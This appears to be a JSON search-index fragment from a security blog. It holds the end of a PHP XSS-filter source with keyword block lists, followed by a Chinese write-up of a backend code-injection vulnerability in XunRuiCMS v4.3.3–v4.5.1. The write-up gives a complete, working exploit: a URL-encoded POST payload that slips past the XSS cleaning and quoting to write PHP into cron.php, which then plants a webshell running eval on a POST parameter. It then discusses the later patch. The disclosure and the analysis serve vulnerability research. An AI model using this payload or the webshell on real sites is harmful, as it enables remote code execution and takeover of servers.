\u0026#39;expression\\s*(\\(|\u0026amp;\\#40;)\u0026#39;, // CSS and IE \u0026#39;vbscript\\s*:\u0026#39;, // IE, surprise! \u0026#39;wscript\\s*:\u0026#39;, // IE \u0026#39;jscript\\s*:\u0026#39;, // IE \u0026#39;vbs\\s*:\u0026#39;, // IE \u0026#39;Redirect\\s+30\\d\u0026#39;, \u0026#34;([\\\u0026#34;\u0026#39;])+data\\s*:[^\\\\1]*?base64[^\\\\1]*?,[^\\\\1]*?\\\\1?\u0026#34; ]; // -------------------------------------------------------------------- /** * XSS Clean * * Sanitizes data so that Cross Site Scripting Hacks can be * prevented. This method does a fair amount of work but * it is extremely thorough, designed to prevent even the * most obscure XSS attempts. Nothing is ever 100% foolproof, * of course, but I haven\u0026#39;t been able to get anything passed * the filter. * * Note: Should only be used to deal with data upon submission. *\tIt\u0026#39;s not something that should be used for general *\truntime processing. * * @link\thttp://channel.bitflux.ch/wiki/XSS_Prevention * Based in part on some code and ideas from Bitflux. * * @link\thttp://ha.ckers.org/xss.html * To help develop this script I used this great list of *\tvulnerabilities along with a few other hacks I\u0026#39;ve *\tharvested from examining vulnerabilities in other programs. * * @param\tstring|string[]\t$str\tInput data * @param bool\t$is_image\t严格的过滤 * @return\tstring */ public function xss_clean($str, $is_image = FALSE) { if (is_numeric($str)) { return $str; } elseif (!$str) { return \u0026#39;\u0026#39;; } // Is the string an array? if (is_array($str)) { foreach ($str as $key =\u0026gt; \u0026amp;$value) { $str[$key] = $this-\u0026gt;xss_clean($value, $is_image); } return $str; } if (json_encode( $str) === false) { return \u0026#39;[xss_clean]\u0026#39;; // 判断含有乱码直接过滤为空 } $this-\u0026gt;naughty_tags = [ \u0026#39;alert\u0026#39;, \u0026#39;area\u0026#39;, \u0026#39;prompt\u0026#39;, \u0026#39;confirm\u0026#39;, \u0026#39;applet\u0026#39;, \u0026#39;audio\u0026#39;, \u0026#39;basefont\u0026#39;, \u0026#39;base\u0026#39;, \u0026#39;behavior\u0026#39;, \u0026#39;bgsound\u0026#39;, \u0026#39;blink\u0026#39;, \u0026#39;body\u0026#39;, \u0026#39;expression\u0026#39;, \u0026#39;form\u0026#39;, \u0026#39;frameset\u0026#39;, \u0026#39;frame\u0026#39;, \u0026#39;head\u0026#39;, \u0026#39;html\u0026#39;, \u0026#39;ilayer\u0026#39;, \u0026#39;input\u0026#39;, \u0026#39;button\u0026#39;, \u0026#39;select\u0026#39;, \u0026#39;isindex\u0026#39;, \u0026#39;layer\u0026#39;, \u0026#39;link\u0026#39;, \u0026#39;meta\u0026#39;, \u0026#39;keygen\u0026#39;, \u0026#39;object\u0026#39;, \u0026#39;plaintext\u0026#39;, \u0026#39;script\u0026#39;, \u0026#39;textarea\u0026#39;, \u0026#39;title\u0026#39;, \u0026#39;math\u0026#39;, \u0026#39;svg\u0026#39;, \u0026#39;xml\u0026#39;, \u0026#39;xss\u0026#39;, //\u0026#39;iframe\u0026#39;, \u0026#39;video\u0026#39;, \u0026#39;embed\u0026#39;, \u0026#39;style\u0026#39; //排除过滤 ]; $this-\u0026gt;evil_attributes = [ \u0026#39;on\\w+\u0026#39;, \u0026#39;xmlns\u0026#39;, \u0026#39;formaction\u0026#39;, \u0026#39;form\u0026#39;, \u0026#39;xlink:href\u0026#39;, \u0026#39;FSCommand\u0026#39;, \u0026#39;seekSegmentTime\u0026#39; // ,\u0026#39;style\u0026#39; 排除过滤 ]; if ($is_image) { // 严格的过滤 $this-\u0026gt;naughty_tags = array_merge($this-\u0026gt;naughty_tags, array(\u0026#39;iframe\u0026#39;, \u0026#39;video\u0026#39;, \u0026#39;embed\u0026#39;, \u0026#39;style\u0026#39;)); $this-\u0026gt;evil_attributes = array_merge($this-\u0026gt;evil_attributes, array(\u0026#39;style\u0026#39;)); /* * URL Decode * * Just in case stuff like this is submitted: * * \u0026lt;a href=\u0026#34;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\u0026#34;\u0026gt;Google\u0026lt;/a\u0026gt; * * Note: Use rawurldecode() so it does not remove plus signs * */ if (stripos($str, \u0026#39;%\u0026#39;) !== false) { do { $oldstr = $str; $str = rawurldecode($str); $str = preg_replace_callback(\u0026#39;#%(?:\\s*[0-9a-f]){2,}#i\u0026#39;, [$this, \u0026#39;_urldecodespaces\u0026#39;], $str); } while ($oldstr !== $str); unset($oldstr); } /* * Convert character entities to ASCII * * This permits our tests below to work reliably. * We only convert entities that are within tags since * these are the ones that will pose security problems. */ // 不进行二次编码的xss过滤 $str = preg_replace_callback(\u0026#34;/[^a-z0-9\u0026gt;]+[a-z0-9]+=([\\\u0026#39;\\\u0026#34;]).*?\\\\1/si\u0026#34;, array($this, \u0026#39;_convert_attribute\u0026#39;), $str); $str = preg_replace_callback(\u0026#39;/\u0026lt;\\w+.*/si\u0026#39;, array($this, \u0026#39;_decode_entity\u0026#39;), $str); } // Remove Invisible Characters Again! $str = remove_invisible_characters($str); /* * Convert all tabs to spaces * * This prevents strings like this: ja\tvascript * NOTE: we deal with spaces between characters later. * NOTE: preg_replace was found to be amazingly slow here on * large blocks of data, so we use str_replace. */ $str = str_replace(\u0026#34;\\t\u0026#34;, \u0026#39; \u0026#39;, $str); // Capture converted string for later comparison $converted_string = $str; // Remove Strings that are never allowed //$str = $this-\u0026gt;_do_never_allowed($str); /* * Makes PHP tags safe * * Note: XML tags are inadvertently replaced too: * * \u0026lt;?xml * * But it doesn\u0026#39;t seem to pose a problem. */ if ($is_image) { // Images have a tendency to have the PHP short opening and // closing tags every so often so we skip those and only // do the long opening tags. $str = preg_replace(\u0026#39;/\u0026lt;\\?(php)/i\u0026#39;, \u0026#39;\u0026amp;lt;?\\\\1\u0026#39;, $str); } else { $str = str_replace([\u0026#39;\u0026lt;?\u0026#39;, \u0026#39;?\u0026#39;.\u0026#39;\u0026gt;\u0026#39;], [\u0026#39;\u0026amp;lt;?\u0026#39;, \u0026#39;?\u0026amp;gt;\u0026#39;], $str); } /* * Compact any exploded words * * This corrects words like: j a v a s c r i p t * These words are compacted back to their correct state. */ $words = [ \u0026#39;javascript\u0026#39;, \u0026#39;expression\u0026#39;, \u0026#39;vbscript\u0026#39;, \u0026#39;jscript\u0026#39;, \u0026#39;wscript\u0026#39;, \u0026#39;vbs\u0026#39;, \u0026#39;script\u0026#39;, \u0026#39;base64\u0026#39;, \u0026#39;applet\u0026#39;, \u0026#39;alert\u0026#39;, \u0026#39;document\u0026#39;, \u0026#39;write\u0026#39;, \u0026#39;cookie\u0026#39;, \u0026#39;window\u0026#39;, \u0026#39;confirm\u0026#39;, \u0026#39;prompt\u0026#39;, \u0026#39;eval\u0026#39; ]; foreach ($words as $word) { $word = implode(\u0026#39;\\s*\u0026#39;, str_split($word)).\u0026#39;\\s*\u0026#39;; // We only want to do this when it is followed by a non-word character // That way valid stuff like \u0026#34;dealer to\u0026#34; does not become \u0026#34;dealerto\u0026#34; $str = preg_replace_callback(\u0026#39;#(\u0026#39;.substr($word, 0, -3).\u0026#39;)(\\W)#is\u0026#39;, array($this, \u0026#39;_compact_exploded_words\u0026#39;), $str); } /* * Remove disallowed Javascript in links or img tags * We used to do some version comparisons and use of stripos(), * but it is dog slow compared to these simplified non-capturing * preg_match(), especially if the pattern exists in the string * * Note: It was reported that not only space characters, but all in * the following pattern can be parsed as separators between a tag name * and its attributes: [\\d\\s\u0026#34;\\\u0026#39;`;,\\/\\=\\(\\x00\\x0B\\x09\\x0C] * ... however, remove_invisible_characters() above already strips the * hex-encoded ones, so we\u0026#39;ll skip them below. */ do { $original = $str; if (preg_match(\u0026#39;/\u0026lt;a/i\u0026#39;, $str)) { $str = preg_replace_callback(\u0026#39;#\u0026lt;a(?:rea)?[^a-z0-9\u0026gt;]+([^\u0026gt;]*?)(?:\u0026gt;|$)#si\u0026#39;, array($this, \u0026#39;_js_link_removal\u0026#39;), $str); } if (preg_match(\u0026#39;/\u0026lt;img/i\u0026#39;, $str)) { $str = preg_replace_callback(\u0026#39;#\u0026lt;img[^a-z0-9]+([^\u0026gt;]*?)(?:\\s?/?\u0026gt;|$)#si\u0026#39;, array($this, \u0026#39;_js_img_removal\u0026#39;), $str); } if (preg_match(\u0026#39;/script|xss/i\u0026#39;, $str)) { $str = preg_replace(\u0026#39;#\u0026lt;/*(?:script|xss).*?\u0026gt;#si\u0026#39;, \u0026#39;[xss_clean]\u0026#39;, $str); } } while ($original !== $str); unset($original); /* * Sanitize naughty HTML elements * * If a tag containing any of the words in the list * below is found, the tag gets converted to entities. * * So this: \u0026lt;blink\u0026gt; * Becomes: \u0026amp;lt;blink\u0026amp;gt; */ $pattern = \u0026#39;#\u0026#39; .\u0026#39;\u0026lt;((?\u0026lt;slash\u0026gt;/*\\s*)((?\u0026lt;tagName\u0026gt;[a-z0-9]+)(?=[^a-z0-9]|$)|.+)\u0026#39; // tag start and name, followed by a non-tag character .\u0026#39;[^\\s\\042\\047a-z0-9\u0026gt;/=]*\u0026#39; // a valid attribute character immediately after the tag would count as a separator // optional attributes .\u0026#39;(?\u0026lt;attributes\u0026gt;(?:[\\s\\042\\047/=]*\u0026#39; // non-attribute characters, excluding \u0026gt; (tag close) for obvious reasons .\u0026#39;[^\\s\\042\\047\u0026gt;/=]+\u0026#39; // attribute characters // optional attribute-value .\u0026#39;(?:\\s*=\u0026#39; // attribute-value separator .\u0026#39;(?:[^\\s\\042\\047=\u0026gt;\u0026lt;`]+|\\s*\\042[^\\042]*\\042|\\s*\\047[^\\047]*\\047|\\s*(?U:[^\\s\\042\\047=\u0026gt;\u0026lt;`]*))\u0026#39; // single, double or non-quoted value .\u0026#39;)?\u0026#39; // end optional attribute-value group .\u0026#39;)*)\u0026#39; // end optional attributes group .\u0026#39;[^\u0026gt;]*)(?\u0026lt;closeTag\u0026gt;\\\u0026gt;)?#isS\u0026#39;; // Note: It would be nice to optimize this for speed, BUT // only matching the naughty elements here results in // false positives and in turn - vulnerabilities! do { $old_str = $str; $str = preg_replace_callback($pattern, array($this, \u0026#39;_sanitize_naughty_html\u0026#39;), $str); } while ($old_str !== $str); unset($old_str); /* * Sanitize naughty scripting elements * * Similar to above, only instead of looking for * tags it looks for PHP and JavaScript commands * that are disallowed. Rather than removing the * code, it simply converts the parenthesis to entities * rendering the code un-executable. * * For example:\teval(\u0026#39;some code\u0026#39;) * Becomes:\teval\u0026amp;#40;\u0026#39;some code\u0026#39;\u0026amp;#41; */ $str = preg_replace( \u0026#39;#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\\s*)\\((.*?)\\)#si\u0026#39;, \u0026#39;\\\\1\\\\2\u0026amp;#40;\\\\3\u0026amp;#41;\u0026#39;, $str ); // Same thing, but for \u0026#34;tag functions\u0026#34; (e.g. eval`some code`) // See https://github.com/bcit-ci/CodeIgniter/issues/5420 $str = preg_replace( \u0026#39;#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\\s*)`(.*?)`#si\u0026#39;, \u0026#39;\\\\1\\\\2\u0026amp;#96;\\\\3\u0026amp;#96;\u0026#39;, $str ); //最终清理 // ////这增加了一点额外的预防措施 // ////有东西通过了上面的过滤器 $str = $this-\u0026gt;_do_never_allowed($str); // now the only remaining whitespace attacks are \\t, \\n, and \\r $ra = [\u0026#39;onabort\u0026#39;, \u0026#39;onactivate\u0026#39;, \u0026#39;onafterprint\u0026#39;, \u0026#39;onafterupdate\u0026#39;, \u0026#39;onbeforeactivate\u0026#39;, \u0026#39;onbeforecopy\u0026#39;, \u0026#39;onbeforecut\u0026#39;, \u0026#39;onbeforedeactivate\u0026#39;, \u0026#39;onbeforeeditfocus\u0026#39;, \u0026#39;onbeforepaste\u0026#39;, \u0026#39;onbeforeprint\u0026#39;, \u0026#39;onbeforeunload\u0026#39;, \u0026#39;onbeforeupdate\u0026#39;, \u0026#39;onblur\u0026#39;, \u0026#39;onbounce\u0026#39;, \u0026#39;oncellchange\u0026#39;, \u0026#39;onchange\u0026#39;, \u0026#39;onclick\u0026#39;, \u0026#39;oncontextmenu\u0026#39;, \u0026#39;oncontrolselect\u0026#39;, \u0026#39;oncopy\u0026#39;, \u0026#39;oncut\u0026#39;, \u0026#39;ondataavailable\u0026#39;, \u0026#39;ondatasetchanged\u0026#39;, \u0026#39;ondatasetcomplete\u0026#39;, \u0026#39;ondblclick\u0026#39;, \u0026#39;ondeactivate\u0026#39;, \u0026#39;ondrag\u0026#39;, \u0026#39;ondragend\u0026#39;, \u0026#39;ondragenter\u0026#39;, \u0026#39;ondragleave\u0026#39;, \u0026#39;ondragover\u0026#39;, \u0026#39;ondragstart\u0026#39;, \u0026#39;ondrop\u0026#39;, \u0026#39;onerror\u0026#39;, \u0026#39;onerrorupdate\u0026#39;, \u0026#39;onfilterchange\u0026#39;, \u0026#39;onfinish\u0026#39;, \u0026#39;onfocus\u0026#39;, \u0026#39;onfocusin\u0026#39;, \u0026#39;onfocusout\u0026#39;, \u0026#39;onhelp\u0026#39;, \u0026#39;onkeydown\u0026#39;, \u0026#39;onkeypress\u0026#39;, \u0026#39;onkeyup\u0026#39;, \u0026#39;onlayoutcomplete\u0026#39;, \u0026#39;onload\u0026#39;, \u0026#39;onlosecapture\u0026#39;, \u0026#39;onmousedown\u0026#39;, \u0026#39;onmouseenter\u0026#39;, \u0026#39;onmouseleave\u0026#39;, \u0026#39;onmousemove\u0026#39;, \u0026#39;onmouseout\u0026#39;, \u0026#39;onmouseover\u0026#39;, \u0026#39;onmouseup\u0026#39;, \u0026#39;onmousewheel\u0026#39;, \u0026#39;onmove\u0026#39;, \u0026#39;onmoveend\u0026#39;, \u0026#39;onmovestart\u0026#39;, \u0026#39;onpaste\u0026#39;, \u0026#39;onpropertychange\u0026#39;, \u0026#39;onreadystatechange\u0026#39;, \u0026#39;onreset\u0026#39;, \u0026#39;onresize\u0026#39;, \u0026#39;onresizeend\u0026#39;, \u0026#39;onresizestart\u0026#39;, \u0026#39;onrowenter\u0026#39;, \u0026#39;onrowexit\u0026#39;, \u0026#39;onrowsdelete\u0026#39;, \u0026#39;onrowsinserted\u0026#39;, \u0026#39;onscroll\u0026#39;, \u0026#39;onselect\u0026#39;, \u0026#39;onselectionchange\u0026#39;, \u0026#39;onselectstart\u0026#39;, \u0026#39;onstart\u0026#39;, \u0026#39;onstop\u0026#39;, \u0026#39;onsubmit\u0026#39;, \u0026#39;onunload\u0026#39;]; foreach ($ra as $t) { $str = str_replace(\u0026#39; \u0026#39;.$t.\u0026#39;=\u0026#34;\u0026#39;, \u0026#39; \u0026#39;.$t.\u0026#39;=\u0026#39;, $str); } return $str; } // -------------------------------------------------------------------- /** * Do Never Allowed * * @used-by\tCI_Security::xss_clean() * @param string * @return string */ protected function _do_never_allowed($str) { $str = str_replace(array_keys($this-\u0026gt;_never_call_str), $this-\u0026gt;_never_call_str, $str); $str = str_replace(array_keys($this-\u0026gt;_never_allowed_str), $this-\u0026gt;_never_allowed_str, $str); foreach ($this-\u0026gt;_never_allowed_regex as $regex) { $str = preg_replace(\u0026#39;#\u0026#39;.$regex.\u0026#39;#is\u0026#39;, \u0026#39;_\\\\0\u0026#39;, $str); } $str = str_replace($this-\u0026gt;_never_call_str, array_keys($this-\u0026gt;_never_call_str), $str); return $str; } } ","date":"2022-04-26T00:00:00Z","image":"https://weltolk.github.io/p/xunruicms-v4.3.3-to-v4.5.1-backstage-code-injection-vulnerabilityfile-write-and-file-inclusion/expliot-db_hud9700ca58d822386b8178068bd5ae476_8790_120x120_fill_box_smart1_3.png","permalink":"https://weltolk.github.io/p/xunruicms-v4.3.3-to-v4.5.1-backstage-code-injection-vulnerabilityfile-write-and-file-inclusion/","title":"XunRuiCMS v4.3.3 to v4.5.1 backstage code injection vulnerability(file write and file inclusion)"},{"content":"触发条件\r两个条件:\n1.迅睿CMS 版本为v4.3.3到v4.5.1\n2.登录后台,且为管理员或具有\u0026quot;应用\u0026quot;-\u0026gt;\u0026ldquo;任务队列\u0026quot;的管理权限\n环境搭建\r1.安装并配置好php与web中间件,注意该cms的低版本需要php的低版本\n2.clone该cms的官方开源地址https://gitee.com/dayrui/xunruicms\n3.通过搜索commit信息里的版本号,回退到指定的版本\n在PhpStorm里,右键指定的commit版本,选择\u0026quot;Reset Current Branch to Here\u0026rdquo;\n选择\u0026quot;Hard\u0026quot;,点击\u0026quot;Reset\u0026quot;\n4.访问,安装,登陆后台\n后台地址:/admin.php\n漏洞描述\rAdmin控制器文件夹下Cron.php控制器的add()函数对于用户的输入没有进行专门的过滤,致使攻击者在具备管理员权限或具有\u0026quot;应用\u0026quot;-\u0026gt;\u0026ldquo;任务队列\u0026quot;的管理权限时可以对WRITEPATH.'config/cron.php'文件写入任意内容,同时该文件有多处被包含且可以被利用的点,正常情况下具有上述的触发条件即可稳定触发该漏洞\n漏洞原理\r在版本v4.3.3之前\r在版本v4.3.3之前,cron.php下并未有add()函数\n在版本v4.3.3到v4.5.0下\r1.该cms在具备上述权限的情况下,可以通过http://host:port/Admin.php?c=Cron\u0026amp;m=add调用Admin控制器文件夹下Cron.php控制器的add()函数\n2.add()函数的代码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 // 任务类型 public function add() { $json = \u0026#39;\u0026#39;; if (is_file(WRITEPATH.\u0026#39;config/cron.php\u0026#39;)) { require WRITEPATH.\u0026#39;config/cron.php\u0026#39;; } $data = json_decode($json, true); if (IS_AJAX_POST) { $post = \\Phpcmf\\Service::L(\u0026#39;input\u0026#39;)-\u0026gt;post(\u0026#39;data\u0026#39;, true); file_put_contents(WRITEPATH.\u0026#39;config/cron.php\u0026#39;, \u0026#39;\u0026lt;?php defined(\\\u0026#39;FCPATH\\\u0026#39;) OR exit(\\\u0026#39;No direct script access allowed\\\u0026#39;);\u0026#39;.PHP_EOL.\u0026#39; $json=\\\u0026#39;\u0026#39;.json_encode($post).\u0026#39;\\\u0026#39;;\u0026#39;); \\Phpcmf\\Service::L(\u0026#39;input\u0026#39;)-\u0026gt;system_log(\u0026#39;设置自定义任务类型\u0026#39;); $this-\u0026gt;_json(1, dr_lang(\u0026#39;操作成功\u0026#39;)); } \\Phpcmf\\Service::V()-\u0026gt;assign([ \u0026#39;data\u0026#39; =\u0026gt; $data, ]); \\Phpcmf\\Service::V()-\u0026gt;display(\u0026#39;cron_add.html\u0026#39;); } add()函数的分析\r1 2 3 if (is_file(WRITEPATH.\u0026#39;config/cron.php\u0026#39;)) { require WRITEPATH.\u0026#39;config/cron.php\u0026#39;; } add()函数首先会在WRITEPATH.'config/cron.php'文件存在时包含该文件,WRITEPATH可在网站根目录的index.php里配置,默认情况下为网站根目录下的cache/\n1 2 $json = \u0026#39;\u0026#39;; $data = json_decode($json, true); 然后add()函数通过json_decode($json, true)函数给$data赋值Null\n1 if (IS_AJAX_POST){} 然后进入一个if分支语句,当IS_AJAX_POST时,则执行相关的写入文件的代码,否则则跳过写入文件,显示Cron的添加页面,随即结束add()函数,IS_AJAX_POST定义为当收到post请求且post的内容不为空时即返回TRUE,否则返回FALSE\n1 $post = \\Phpcmf\\Service::L(\u0026#39;input\u0026#39;)-\u0026gt;post(\u0026#39;data\u0026#39;, true); if语句中,首先\\Phpcmf\\Service::L('input')-\u0026gt;post('data', true)该代码通过调用Input.php文件里定义的Input类的post()函数,在接收到post请求且存在key为data时进行xss清洗然后返回,否则直接返回false,然后赋值给$post,xss清洗的代码比较长,我放在本文章的最后,此处的xss清洗可以轻易的绕过,从而达到写入我们想要的任意内容\n1 2 file_put_contents(WRITEPATH.\u0026#39;config/cron.php\u0026#39;, \u0026#39;\u0026lt;?php defined(\\\u0026#39;FCPATH\\\u0026#39;) OR exit(\\\u0026#39;No direct script access allowed\\\u0026#39;);\u0026#39;.PHP_EOL.\u0026#39; $json=\\\u0026#39;\u0026#39;.json_encode($post).\u0026#39;\\\u0026#39;;\u0026#39;); if语句中,接收完post请求,即将接收到的内容通过json编码后写入WRITEPATH.'config/cron.php'文件,可控的写入点位于字符串$json的赋值中,且在两个'的包裹中,此处是漏洞产生的主要原因,未对用户的输入做足够的判断或清洗即写入相应的文件\n1 2 \\Phpcmf\\Service::L(\u0026#39;input\u0026#39;)-\u0026gt;system_log(\u0026#39;设置自定义任务类型\u0026#39;); $this-\u0026gt;_json(1, dr_lang(\u0026#39;操作成功\u0026#39;)); if语句的最后,写入日志并显示操作结果,随即显示cron添加界面,add()函数结束\n绕过json编码和xss清洗以及WRITEPATH.'config/cron.php'文件中'的包裹\r通过前文的分析,我们可以发现,add()函数对用户的输入基本没有特殊的防范,只要绕过xss清洗和json编码以及WRITEPATH.'config/cron.php'文件中'的包裹即可写入我们想要的任意内容\n以下是我的一种方法,在WRITEPATH.'config/cron.php'文件中写入了当运行WRITEPATH.'config/cron.php'文件时在网站根目录写一个名为webshell.php,内容为\u0026lt;?php eval(@$_POST[\u0026quot;password\u0026quot;]);?\u0026gt;的文件的php语句\n注意下述操作需要先获取csrf_test_name,获取方法:\n1.访问http://host:port/Admin.php?c=Cron\u0026amp;m=add\n2.抓包当点击\u0026quot;保存\u0026quot;时发送的post包\n3.post的内容里的csrf_test_name即可一直用作一段时间内的csrf_test_name\n获取到csrf_test_name之后,给http://host:port/Admin.php?c=Cron\u0026amp;m=addpost以下内容:\n1 isform=1\u0026amp;csrf_test_name=3318a4fabdf4ea654734315a4d508a5f\u0026amp;data%5B1%5D%5Bname%5D=\u0026amp;data%5B1%5D%5Bcode%5D=%5B\u0026#39;;file_put_contents(\u0026#39;webshell.php\u0026#39;,htmlspecialchars_decode(\u0026#39;\u0026lt;\u0026#39;).\u0026#39;?php%20eval\u0026#39;.base64_decode(\u0026#39;KA==\u0026#39;).\u0026#39;@$_POST%5B\u0026#39;.base64_decode(\u0026#39;Ig==\u0026#39;).\u0026#39;password\u0026#39;.base64_decode(\u0026#39;Ig==\u0026#39;).\u0026#39;%5D\u0026#39;.base64_decode(\u0026#39;KQ==\u0026#39;).\u0026#39;;?\u0026#39;.htmlspecialchars_decode(\u0026#39;\u0026gt;\u0026#39;));return;\u0026#39;%5D 经过url解码后为:\n1 isform=1\u0026amp;csrf_test_name=3318a4fabdf4ea654734315a4d508a5f\u0026amp;data[1][name]=\u0026amp;data[1][code]=[\u0026#39;;file_put_contents(\u0026#39;webshell.php\u0026#39;,htmlspecialchars_decode(\u0026#39;\u0026amp;lt;\u0026#39;).\u0026#39;?php eval\u0026#39;.base64_decode(\u0026#39;KA==\u0026#39;).\u0026#39;@$_POST[\u0026#39;.base64_decode(\u0026#39;Ig==\u0026#39;).\u0026#39;password\u0026#39;.base64_decode(\u0026#39;Ig==\u0026#39;).\u0026#39;]\u0026#39;.base64_decode(\u0026#39;KQ==\u0026#39;).\u0026#39;;?\u0026#39;.htmlspecialchars_decode(\u0026#39;\u0026amp;gt;\u0026#39;));return;\u0026#39;] 绕过json编码和xss清洗后,写入WRITEPATH.'config/cron.php'文件中的内容为:\n1 2 \u0026lt;?php defined(\u0026#39;FCPATH\u0026#39;) OR exit(\u0026#39;No direct script access allowed\u0026#39;); $json=\u0026#39;{\u0026#34;1\u0026#34;:{\u0026#34;name\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;code\u0026#34;:\u0026#34;[\u0026#39;;file_put_contents(\u0026#39;webshell.php\u0026#39;,htmlspecialchars_decode(\u0026#39;\u0026amp;lt;\u0026#39;).\u0026#39;?php eval\u0026#39;.base64_decode(\u0026#39;KA==\u0026#39;).\u0026#39;@$_POST[\u0026#39;.base64_decode(\u0026#39;Ig==\u0026#39;).\u0026#39;password\u0026#39;.base64_decode(\u0026#39;Ig==\u0026#39;).\u0026#39;]\u0026#39;.base64_decode(\u0026#39;KQ==\u0026#39;).\u0026#39;;?\u0026#39;.htmlspecialchars_decode(\u0026#39;\u0026gt;\u0026#39;));return;\u0026#39;]\u0026#34;}}\u0026#39;; 此post内容中的关键处为\n1 [\u0026#39;;file_put_contents(\u0026#39;webshell.php\u0026#39;,htmlspecialchars_decode(\u0026#39;\u0026amp;lt;\u0026#39;).\u0026#39;?php eval\u0026#39;.base64_decode(\u0026#39;KA==\u0026#39;).\u0026#39;@$_POST[\u0026#39;.base64_decode(\u0026#39;Ig==\u0026#39;).\u0026#39;password\u0026#39;.base64_decode(\u0026#39;Ig==\u0026#39;).\u0026#39;]\u0026#39;.base64_decode(\u0026#39;KQ==\u0026#39;).\u0026#39;;?\u0026#39;.htmlspecialchars_decode(\u0026#39;\u0026amp;gt;\u0026#39;));return;\u0026#39;] 绕过json编码和xss清洗后,此处的内容变为:\n1 [\u0026#39;;file_put_contents(\u0026#39;webshell.php\u0026#39;,htmlspecialchars_decode(\u0026#39;\u0026amp;lt;\u0026#39;).\u0026#39;?php eval\u0026#39;.base64_decode(\u0026#39;KA==\u0026#39;).\u0026#39;@$_POST[\u0026#39;.base64_decode(\u0026#39;Ig==\u0026#39;).\u0026#39;password\u0026#39;.base64_decode(\u0026#39;Ig==\u0026#39;).\u0026#39;]\u0026#39;.base64_decode(\u0026#39;KQ==\u0026#39;).\u0026#39;;?\u0026#39;.htmlspecialchars_decode(\u0026#39;\u0026gt;\u0026#39;));return;\u0026#39;] 闭合了WRITEPATH.'config/cron.php'文件中'的包裹\n包含写入的WRITEPATH.'config/cron.php'文件\r通过前面对add()函数的分析,调用add()函数时会首先在WRITEPATH.'config/cron.php'文件存在时包含WRITEPATH.'config/cron.php'文件,因此直接访问http://host:port/Admin.php?c=Cron\u0026amp;m=add即可\n访问http://host:port/Admin.php?c=Cron\u0026amp;m=add后,在网站根目录下会生成一个名为webshell.php的文件,文件内容为\u0026lt;?php eval(@$_POST[\u0026quot;password\u0026quot;]);?\u0026gt;\n版本v4.5.1\radd()函数的代码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // 任务类型 public function add() { $json = \u0026#39;\u0026#39;; if (is_file(WRITEPATH.\u0026#39;config/cron.php\u0026#39;)) { require WRITEPATH.\u0026#39;config/cron.php\u0026#39;; } $data = json_decode($json, true); if (IS_AJAX_POST) { $post = \\Phpcmf\\Service::L(\u0026#39;input\u0026#39;)-\u0026gt;post(\u0026#39;data\u0026#39;); if ($post \u0026amp;\u0026amp; is_array($post)) { foreach ($post as $key =\u0026gt; $t) { if (!$t || !$t[\u0026#39;name\u0026#39;]) { unset($post[$key]); } $post[$key][\u0026#39;name\u0026#39;] = dr_safe_filename($t[\u0026#39;name\u0026#39;]); $post[$key][\u0026#39;code\u0026#39;] = dr_safe_filename($t[\u0026#39;code\u0026#39;]); } } else { $post = []; } file_put_contents(WRITEPATH.\u0026#39;config/cron.php\u0026#39;, \u0026#39;\u0026lt;?php defined(\\\u0026#39;FCPATH\\\u0026#39;) OR exit(\\\u0026#39;No direct script access allowed\\\u0026#39;);\u0026#39;.PHP_EOL.\u0026#39; $json=\\\u0026#39;\u0026#39;.json_encode($post).\u0026#39;\\\u0026#39;;\u0026#39;); \\Phpcmf\\Service::L(\u0026#39;input\u0026#39;)-\u0026gt;system_log(\u0026#39;设置自定义任务类型\u0026#39;); $this-\u0026gt;_json(1, dr_lang(\u0026#39;操作成功\u0026#39;)); } \\Phpcmf\\Service::V()-\u0026gt;assign([ \u0026#39;data\u0026#39; =\u0026gt; $data, ]); \\Phpcmf\\Service::V()-\u0026gt;display(\u0026#39;cron_add.html\u0026#39;); } 版本v4.5.1相较之前的版本,在获取post的内容时,修改了如下的代码:\n1 $post = \\Phpcmf\\Service::L(\u0026#39;input\u0026#39;)-\u0026gt;post(\u0026#39;data\u0026#39;,true); 改为\n1 $post = \\Phpcmf\\Service::L(\u0026#39;input\u0026#39;)-\u0026gt;post(\u0026#39;data\u0026#39;); post()函数的第二个参数为是否进行xss清洗,因为post()函数第二个参数的默认值为true,所以这处改动理论上不造成任何影响\n同时,在获取post的内容后,进行WRITEPATH.'config/cron.php'文件的写入前,增加了如下的代码:\n1 2 3 4 5 6 7 8 9 10 11 if ($post \u0026amp;\u0026amp; is_array($post)) { foreach ($post as $key =\u0026gt; $t) { if (!$t || !$t[\u0026#39;name\u0026#39;]) { unset($post[$key]); } $post[$key][\u0026#39;name\u0026#39;] = dr_safe_filename($t[\u0026#39;name\u0026#39;]); $post[$key][\u0026#39;code\u0026#39;] = dr_safe_filename($t[\u0026#39;code\u0026#39;]); } } else { $post = []; } 上述代码先判断post的内容是否存在且为数组,不符合则将post的内容置为空数组,满足则遍历post的内容,如果post的内容里某个键值对的value不存在或某个键值对的value的'name'key的value不存在,则销毁该键值对,然后将每个键值对的value的'name'key和'code'key通过dr_safe_filename()函数清洗,以下为dr_safe_filename()函数的代码:\n1 2 3 4 5 6 7 8 9 10 /** * 安全过滤文件及目录名称函数 */ function dr_safe_filename($string) { return str_replace( [\u0026#39;..\u0026#39;, \u0026#34;/\u0026#34;, \u0026#39;\\\\\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#34;{\u0026#34;, \u0026#39;}\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;:\u0026#39;, \u0026#39;[\u0026#39;, \u0026#39;]\u0026#39;, \u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;*\u0026#39;, \u0026#39;?\u0026#39;], \u0026#39;\u0026#39;, (string)$string ); } 